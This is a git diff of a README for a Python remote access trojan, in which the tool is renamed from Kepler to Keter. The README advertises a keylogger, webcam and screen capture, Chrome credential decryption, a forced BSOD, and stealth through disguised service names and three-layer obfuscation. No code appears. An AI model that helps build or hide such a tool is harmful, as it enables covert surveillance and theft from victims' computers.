@@ -1,7 +1,7 @@
 <html>
   <img src="./images/logo.png">
   </html>                                                
-Kepler Remote Access Tool.
+Keter Remote Access Tool.
 <br><br>
 This is a Remote Access Tool (RAT). It is built on python, and it works by connecting to ngrok through **YOUR OWN** authtoken, and from there you can access
 the web and control the client. It uses an obfuscation script to run it through a 3-layer encryption to further hide the program and, if found, makes it very difficult to find the code's true purpose. This is the v2 version of another RAT that was controlled through a discord bot (Discord-Bot-RAT) and we are
@@ -9,7 +9,7 @@ currently working on making a v3 built on C that directly connects to the server
 
 ### Features 
 
-##### Kepler Client
+##### Keter Client
 Feature | Description
 --------|-------------
 Stealth | Runs in the background (we recommend giving the client a common service name, e.g: COMSurrogate).
@@ -18,7 +18,7 @@ Upload / Download / Remove Files | Upload, download and remove files from the cl
 Screenshot | Take screenshot.
 Webcam Photo | Capture default camera photo.
 Keylogger | Log Keystrokes and save to file.
-Check Admin | Get Kepler Client process admin status.
+Check Admin | Get Keter Client process admin status.
 Power off | Power off the Client system.
 Reboot | Reboot the client system.
 Trigger BSOD | Trigger the iconic Blue Screen Of Death.
@@ -66,6 +66,6 @@ You can contact us on Discord: @1ypi, @iznard.
 ### CREDIT
 Credit to xaitax for the Chrome App Bound Encryption Decryption. 
 #### LICENSE
-[VIEW LICENSE](https://github.com/1ypi/keplerrat/blob/main/LICENSE) 
+[VIEW LICENSE](https://github.com/1ypi/Keterrat/blob/main/LICENSE) 
 
 The Developers are not responsible for any misuse of Damage caused by the program. This is created only for EDUCATIONAL PURPOSES.
